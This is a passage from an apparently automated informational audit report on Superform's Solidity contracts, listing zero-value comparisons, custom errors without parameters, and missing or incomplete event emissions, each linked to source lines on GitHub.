218:         if (superChainId_ == 0 || ambChainId_ == 0) {

/// @audit != 0
226:         if (oldSuperChainId != 0) {

/// @audit != 0
230:         if (oldAmbChainId != 0) {

/// @audit == 0
245:         if (chainId_ == 0) {

```

[115](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L115), [218](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L218), [218](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L218), [226](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L226), [230](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L230), [245](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L245)

```solidity
File: superform-core/src/crosschain-data/extensions/CoreStateRegistry.sol

/// @audit != 0
98:         if (isMulti != 0) {

/// @audit == 1
178:             isMulti == 1

/// @audit == 1
186:                 returnMessage = isMulti == 1

/// @audit == 1
194:                 returnMessage = isMulti == 1

/// @audit == 0
218:             failedDeposits_.superformIds.length == 0 || proposedAmounts_.length == 0

/// @audit == 0
218:             failedDeposits_.superformIds.length == 0 || proposedAmounts_.length == 0

/// @audit != 0
224:         if (failedDeposits_.lastProposedTimestamp != 0) {

/// @audit == 1
235:         if (multi == 1) {

/// @audit == 0
264:             failedDeposits_.lastProposedTimestamp == 0

/// @audit == 0
287:             failedDeposits_.lastProposedTimestamp == 0

/// @audit == 0
342:         if (delay == 0) {

/// @audit == 0
406:             if (finalAmounts_[i] == 0) {

/// @audit != 0
429:         if (validLen != 0) {

/// @audit != 0
437:                 if (multiVaultData.amounts[i] != 0) {

/// @audit == 0
469:         if (finalAmount_ == 0) {

/// @audit == 1
605:         if (multi == 1) {

/// @audit == 0
618:         if (multi == 0) {

/// @audit != 0
641:             if (txData_[i].length != 0 && multiVaultData_.liqData[i].txData.length == 0) {

/// @audit == 0
641:             if (txData_[i].length != 0 && multiVaultData_.liqData[i].txData.length == 0) {

/// @audit != 0
771:             if (multiVaultData.amounts[i] != 0) {

/// @audit != 0
794:                         if (dstAmount != 0 && !multiVaultData.retain4626s[i]) {

/// @audit != 0
899:                 if (dstAmount != 0 && !singleVaultData.retain4626) {

/// @audit != 0
929:         if (returnMessage_.length != 0) {

```

[98](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L98), [178](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L178), [186](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L186), [194](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L194), [218](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L218), [218](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L218), [224](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L224), [235](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L235), [264](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L264), [287](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L287), [342](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L342), [406](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L406), [429](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L429), [437](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L437), [469](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L469), [605](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L605), [618](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L618), [641](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L641), [641](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L641), [771](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L771), [794](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L794), [899](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L899), [929](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L929)

```solidity
File: superform-core/src/crosschain-data/extensions/TimelockStateRegistry.sol

/// @audit != 0
147:         if (txData_.length != 0) {

/// @audit == 1
181:             if (p.isXChain == 1) {

/// @audit == 0
190:             if (p.isXChain == 0) {

```

[147](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L147), [181](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L181), [190](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L190)

```solidity
File: superform-core/src/crosschain-data/utils/PayloadHelper.sol

/// @audit == 1
156:         if (v.multi == 1) {

/// @audit == 0
173:         if (txInfo == 0) {

/// @audit == 1
277:         if (multi_ == 1) {

/// @audit == 1
305:         if (multi_ == 1) {

/// @audit != 0
373:             if (imvd.liqData[i].txData.length != 0) {

/// @audit != 0
417:         if (isvd.liqData.txData.length != 0) {

```

[156](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L156), [173](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L173), [277](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L277), [305](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L305), [373](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L373), [417](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L417)

```solidity
File: superform-core/src/crosschain-data/utils/QuorumManager.sol

/// @audit == 0
25:         if (srcChainId_ == 0) {

```

[25](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/QuorumManager.sol#L25)

```solidity
File: superform-core/src/crosschain-liquidity/DstSwapper.sol

/// @audit == 0
107:         if (amount == 0) {

/// @audit != 0
148:         if (multi != 0) revert Error.INVALID_PAYLOAD_TYPE();

/// @audit != 1
177:         if (multi != 1) revert Error.INVALID_PAYLOAD_TYPE();

/// @audit != 0
206:         if (multi != 0) revert Error.INVALID_PAYLOAD_TYPE();

/// @audit != 1
236:         if (multi != 1) revert Error.INVALID_PAYLOAD_TYPE();

/// @audit != 0
290:         if (swappedAmount[payloadId_][index_] != 0) {

/// @audit != 0
384:         if (failedSwap[payloadId_][index_].amount != 0) {

/// @audit == 0
388:         if (amount_ == 0) {

/// @audit == 1
430:         if (multi == 1) {

/// @audit != 0
442:             if (index_ != 0) {

```

[107](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L107), [148](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L148), [177](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L177), [206](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L206), [236](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L236), [290](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L290), [384](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L384), [388](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L388), [430](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L430), [442](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L442)

```solidity
File: superform-core/src/crosschain-liquidity/socket/SocketValidator.sol

/// @audit == 0
69:             (decodedReq.middlewareRequest.id == 0 && args_.liqDataToken != decodedReq.bridgeRequest.inputToken)

/// @audit != 0
70:                 || (decodedReq.middlewareRequest.id != 0 && args_.liqDataToken != decodedReq.middlewareRequest.inputToken)

```

[69](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/socket/SocketValidator.sol#L69), [70](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/socket/SocketValidator.sol#L70)

```solidity
File: superform-core/src/forms/ERC4626FormImplementation.sol

/// @audit == 0
164:         if (address(token) != NATIVE && singleVaultData_.liqData.txData.length == 0) {

/// @audit != 0
179:         if (singleVaultData_.liqData.txData.length != 0) {

/// @audit == 0
287:         v.receiver = v.len1 == 0 ? srcSender_ : address(this);

/// @audit != 0
295:         if (v.len1 != 0) {

/// @audit == 0
344:         if (singleVaultData_.liqData.token != address(0) && len == 0) {

/// @audit == 0
355:         vars.receiver = len == 0 ? singleVaultData_.receiverAddress : address(this);

/// @audit != 0
363:         if (len != 0) {

/// @audit != 0
417:         if (dust != 0) {

```

[164](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L164), [179](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L179), [287](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L287), [295](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L295), [344](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L344), [355](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L355), [363](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L363), [417](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L417)

```solidity
File: superform-core/src/forms/ERC4626TimelockForm.sol

/// @audit == 0
83:         if (vars.liqData.token != address(0) && vars.len1 == 0) {

/// @audit != 0
85:         } else if (vars.liqData.token == address(0) && vars.len1 != 0) {

/// @audit == 0
90:         vars.receiver = vars.len1 == 0 ? p_.data.receiverAddress : address(this);

/// @audit != 0
94:         if (vars.len1 != 0) {

/// @audit == 1
108:                     p_.isXChain == 1 ? p_.srcChainId : vars.chainId,

```

[83](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626TimelockForm.sol#L83), [85](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626TimelockForm.sol#L85), [90](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626TimelockForm.sol#L90), [94](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626TimelockForm.sol#L94), [108](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626TimelockForm.sol#L108)

```solidity
File: superform-core/src/libraries/DataLib.sol

/// @audit == 0
55:         if (chainId_ == 0) {

/// @audit == 0
78:         if (chainId_ == 0) {

```

[55](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L55), [78](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L78)

```solidity
File: superform-core/src/libraries/PayloadUpdaterLib.sol

/// @audit != 0
37:         if (req_.token == address(0) || (req_.token != address(0) && req_.txData.length != 0)) {

```

[37](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/PayloadUpdaterLib.sol#L37)

```solidity
File: superform-core/src/payments/PayMaster.sol

/// @audit == 0
93:         if (msg.value == 0) {

```

[93](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PayMaster.sol#L93)

```solidity
File: superform-core/src/payments/PaymentHelper.sol

/// @audit == 1
471:         if (configType_ == 1) {

/// @audit == 2
476:         if (configType_ == 2) {

/// @audit == 3
481:         if (configType_ == 3) {

/// @audit == 4
486:         if (configType_ == 4) {

/// @audit == 5
491:         if (configType_ == 5) {

/// @audit == 6
496:         if (configType_ == 6) {

/// @audit == 7
501:         if (configType_ == 7) {

/// @audit == 8
506:         if (configType_ == 8) {

/// @audit == 9
511:         if (configType_ == 9) {

/// @audit == 10
516:         if (configType_ == 10) {

/// @audit == 11
521:         if (configType_ == 11) {

/// @audit != 0
569:             uint256 gasReq = i != 0 ? totalDstGasReqInWeiForProof : totalDstGasReqInWei;

/// @audit == 1
578:             if (ambIds_[i] == 1) {

/// @audit == 2
580:             } else if (ambIds_[i] == 2) {

/// @audit == 3
582:             } else if (ambIds_[i] == 3) {

/// @audit != 0
603:         if (v.callbackType != 0) return 0;

/// @audit == 1
605:         if (v.isMulti == 1) {

/// @audit != 0
644:                     dstChainId_, i != 0 ? proof_ : abi.encode(ambIdEncodedMessage), extraDataPerAMB[i]

/// @audit != 0
677:                     dstChainId_, i != 0 ? proof_ : abi.encode(ambIdEncodedMessage), extraDataPerAMB[i]

/// @audit == 0
717:         if (totalSwaps == 0) {

/// @audit == 0
804:         if (dstNativeFee == 0) {

/// @audit == 0
812:         if (dstUsdValue == 0) {

/// @audit <= 0
834:             if (value <= 0) revert Error.CHAINLINK_MALFUNCTION();

/// @audit == 0
835:             if (updatedAt == 0) revert Error.CHAINLINK_INCOMPLETE_ROUND();

/// @audit <= 0
848:             if (dstTokenPrice <= 0) revert Error.CHAINLINK_MALFUNCTION();

/// @audit == 0
849:             if (updatedAt == 0) revert Error.CHAINLINK_INCOMPLETE_ROUND();

```

[471](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L471), [476](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L476), [481](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L481), [486](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L486), [491](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L491), [496](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L496), [501](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L501), [506](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L506), [511](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L511), [516](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L516), [521](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L521), [569](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L569), [578](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L578), [580](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L580), [582](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L582), [603](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L603), [605](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L605), [644](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L644), [677](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L677), [717](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L717), [804](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L804), [812](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L812), [834](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L834), [835](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L835), [848](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L848), [849](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L849)

```solidity
File: superform-core/src/settings/SuperRBAC.sol

/// @audit != 0
175:         if (extraData_.length != 0) {

/// @audit == 1
209:             if (getRoleMemberCount(role_) == 1) revert Error.CANNOT_REVOKE_LAST_ADMIN();

```

[175](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L175), [209](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L209)

```solidity
File: superform-core/src/settings/SuperRegistry.sol

/// @audit != 0
179:         if (stateRegistryIds[registryAddress_] != 0) return true;

/// @audit != 0
187:         if (ambId != 0 && !isBroadcastAMB[ambId]) return true;

/// @audit != 0
195:         if (ambId != 0 && isBroadcastAMB[ambId]) return true;

/// @audit == 0
233:         if (vaultLimit_ == 0) {

/// @audit != 0
309:             if (ambAddresses[ambId] != address(0) || ambIds[ambAddress] != 0) revert Error.DISABLED();

/// @audit != 0
334:             if (registryAddresses[registryId] != address(0) || stateRegistryIds[registryAddress] != 0) {

```

[179](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L179), [187](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L187), [195](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L195), [233](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L233), [309](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L309), [334](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L334)



### Custom error has no error details

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Consider adding parameters to the error to indicate which user or values caused the failure

*Instances (1)*:

```solidity
File: ERC1155A/src/aERC20.sol

14:     error ONLY_ERC1155A();

```

[14](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/aERC20.sol#L14)



### Events should be emitted when critical changes are made to the contracts.

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

*Instances (3)*:

```solidity
File: superform-core/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol

182:     function setReceiver(uint32 domain_, address authorizedImpl_) external onlyProtocolAdmin {
183:             if (domain_ == 0) {
184:                 revert Error.INVALID_CHAIN_ID();
185:             }
186:     
187:             if (authorizedImpl_ == address(0)) {
188:                 revert Error.ZERO_ADDRESS();
189:             }
190:     
191:             authorizedImpl[domain_] = authorizedImpl_;
192:         }

```

[182-192](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L182-L192)


```solidity
File: superform-core/src/settings/SuperRBAC.sol

144:     function setSuperRegistry(address superRegistry_) external override onlyRole(PROTOCOL_ADMIN_ROLE) {
145:             if (address(superRegistry) != address(0)) revert Error.DISABLED();
146:     
147:             if (superRegistry_ == address(0)) revert Error.ZERO_ADDRESS();
148:     
149:             superRegistry = ISuperRegistry(superRegistry_);
150:         }

153:     function setRoleAdmin(bytes32 role_, bytes32 adminRole_) external override onlyRole(PROTOCOL_ADMIN_ROLE) {
154:             _setRoleAdmin(role_, adminRole_);
155:         }

```

[144-150](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L144-L150), [153-155](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L153-L155)




### Events that mark critical parameter changes should contain both the old and the new value

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

This should especially be done if the new value is not required to be different from the old value

*Instances (20)*:

```solidity
File: superform-core/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol

91:         emit MailboxAdded(address(mailbox_));

92:         emit GasPayMasterAdded(address(igp_));

175:         emit ChainAdded(superChainId_);

```

[91](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L91), [92](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L92), [175](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L175)

```solidity
File: superform-core/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol

231:         emit ChainAdded(superChainId_);

```

[231](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L231)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol

90:             emit WormholeRelayerSet(address(relayer));

228:         emit ChainAdded(superChainId_);

```

[90](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L90), [228](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L228)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol

100:             emit WormholeCoreSet(address(wormhole));

109:         emit WormholeRelayerSet(address(relayer));

120:         emit BroadcastFinalitySet(broadcastFinality);

237:         emit ChainAdded(superChainId_);

```

[100](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L100), [109](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L109), [120](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L120), [237](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L237)

```solidity
File: superform-core/src/crosschain-data/extensions/CoreStateRegistry.sol

109:             emit PayloadProcessed(payloadId_);

110:             emit FailedXChainDeposits(payloadId_);

143:         emit PayloadUpdated(payloadId_);

1008:         emit PayloadUpdated(payloadId_);

```

[109](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L109), [110](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L110), [143](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L143), [1008](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L1008)


```solidity
File: superform-core/src/settings/SuperRegistry.sol

228:         emit SetPermit2(permit2_);

